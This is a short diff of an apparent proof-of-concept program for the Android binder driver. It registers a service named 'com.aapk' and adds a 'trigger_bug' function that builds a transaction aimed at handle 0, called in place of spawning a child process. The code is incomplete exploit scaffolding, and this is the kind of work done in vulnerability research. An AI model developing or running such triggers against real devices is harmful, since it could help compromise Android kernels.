@@ -33,12 +33,20 @@ void child(){
     size_t name_len = sizeof(name);
 
     uint32_t handle = get_binder_service(
-        info_ptr, name, name_len, COOKIE, HANDLE, 1, 2);
+        info_ptr, name, name_len, COOKIE, 1, 2);
     if(!handle){
         puts("aapk handle is 0!\n");
         return;
     }
     printf("aapk handle is %d\n", handle);
+}
+
+void trigger_bug(PBINDER_INFO info){
+    NEW_BINDER_OBJECT_BUILDER(bob);
+    NEW_TR_BUILDER(tb);
+
+    tb.set_tr_target_handle_(&tb, 0);
+    tb.set_tr_cookie_(&tb, 0);
 }
 
 void parent(){
@@ -54,7 +62,8 @@ void parent(){
     uint16_t name[] = {'c', 'o', 'm', '.', 'a', 'a', 'p', 'k'};
     size_t name_len = sizeof(name);
     register_binder_service(info_ptr, name, name_len, COOKIE, HANDLE, 1, 2, 3, 4);
-    CHECK(create_process(child) >= 0);
+    trigger_bug(info_ptr);
+    //CHECK(create_process(child) >= 0);
     getchar();
     binder_close(info_ptr);
 }
